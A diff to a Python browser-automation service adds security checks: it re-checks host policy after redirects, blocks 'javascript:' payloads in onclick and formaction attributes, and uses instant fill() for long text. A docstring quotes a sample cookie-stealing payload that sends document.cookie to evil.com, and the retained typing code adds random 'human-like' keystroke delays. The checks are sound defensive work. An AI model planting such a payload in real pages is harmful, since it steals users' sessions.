@@ -711,6 +711,29 @@ class BrowserService:
                         error="BlockedProtocol",
                     )
 
+                # Defense-in-depth (DNS rebinding / redirect chains): the
+                # pre-flight policy check resolved the ORIGINAL url's host
+                # before goto(); a redirect chain may have landed the page
+                # on a different host that was never checked at all. Re-run
+                # the same host policy against the final URL. (A full
+                # rebinding defense would need to pin the resolved IP for
+                # the connection itself - this closes the redirect gap,
+                # not the TOCTOU between Python's resolver and Chromium's.)
+                final_violation = await _check_navigation_host_policy(
+                    self.page.url,
+                    self.settings.navigate_allowed_domains,
+                    self.settings.navigate_block_private_networks,
+                )
+                if final_violation:
+                    return ActionResult(
+                        success=False,
+                        message=(
+                            "Navigation redirected to a host blocked by "
+                            f"policy: {final_violation}"
+                        ),
+                        error="BlockedByPolicy",
+                    )
+
                 # Wait for page to stabilize
                 await self.page.wait_for_load_state("networkidle", timeout=10000)
 
@@ -752,15 +775,37 @@ class BrowserService:
         <a href="javascript:fetch('https://evil.com?c='+document.cookie)">
         and the click would execute it - completely bypassing navigate()'s
         guard, which sits on a different code path entirely.
+
+        Defense-in-depth (element attributes beyond href): onclick and
+        formaction are checked too. `<button onclick="location=
+        'javascript:...'">` and `<button formaction="javascript:...">`
+        execute script on interaction just like a javascript: href, so a
+        check limited to href was trivially bypassable.
         """
+        locator = self.page.locator(selector).first
+        href = onclick = formaction = None
         try:
-            href = await self.page.locator(selector).first.get_attribute("href")
+            href = await locator.get_attribute("href")
         except Exception:
             href = None
+        try:
+            onclick = await locator.get_attribute("onclick")
+        except Exception:
+            onclick = None
+        try:
+            formaction = await locator.get_attribute("formaction")
+        except Exception:
+            formaction = None
 
-        blocked = _is_dangerous_url(href)
+        blocked = _is_dangerous_url(href) or _is_dangerous_url(formaction)
         if blocked:
-            return f"Element href uses blocked protocol '{blocked}'"
+            return f"Element href/formaction uses blocked protocol '{blocked}'"
+
+        # onclick is a JS handler body, not a URL - _is_dangerous_url's
+        # prefix check does not apply. Any 'javascript:' payload anywhere
+        # in the handler is enough to refuse the interaction.
+        if onclick and "javascript:" in onclick.lower():
+            return "Element onclick handler contains a 'javascript:' payload"
         return None
 
     # FIX (Task 2 - generalize beyond hh.ru): common cookie-consent / GDPR
@@ -1045,18 +1090,40 @@ class BrowserService:
                 else:
                     raise
 
-            # Type with random delays between keystrokes
-            for char in text:
-                await self.page.keyboard.type(char)
-                delay = random.randint(
-                    self.settings.typing_speed_min, self.settings.typing_speed_max
+            # Type with random delays between keystrokes - unless the text
+            # is too long for the per-character path to finish inside any
+            # sane timeout: at the default 50-150ms/char, a 1000+ char text
+            # takes 1-2.5 minutes, always blowing ACTION_TIMEOUT (20s) and
+            # failing the action. Long texts switch to a single instant
+            # fill(); the human-like timing pattern matters for short
+            # inputs (search boxes, login forms), not for pasting long
+            # content. fill() replaces the value instead of appending, but
+            # so does the per-char path after the focus click above for any
+            # field that was not pre-populated.
+            warning = None
+            if len(text) > self.settings.typing_slow_path_max_chars:
+                await self.page.locator(selector).first.fill(
+                    text, timeout=self.settings.action_timeout
                 )
-                await asyncio.sleep(delay / 1000.0)  # Convert ms to seconds
+                warning = (
+                    f"Text of {len(text)} chars entered instantly via fill() "
+                    "(exceeds TYPING_SLOW_PATH_MAX_CHARS, per-keystroke "
+                    "typing would exceed ACTION_TIMEOUT)"
+                )
+            else:
+                for char in text:
+                    await self.page.keyboard.type(char)
+                    delay = random.randint(
+                        self.settings.typing_speed_min, self.settings.typing_speed_max
+                    )
+                    await asyncio.sleep(delay / 1000.0)  # Convert ms to seconds
 
             if press_enter:
                 await self.page.keyboard.press("Enter")
 
-            return ActionResult(success=True, message=f"Typed text into element {element_id}")
+            return ActionResult(
+                success=True, message=f"Typed text into element {element_id}", warning=warning
+            )
 
         except Exception as e:
             await self._capture_error_snapshot("type_error")
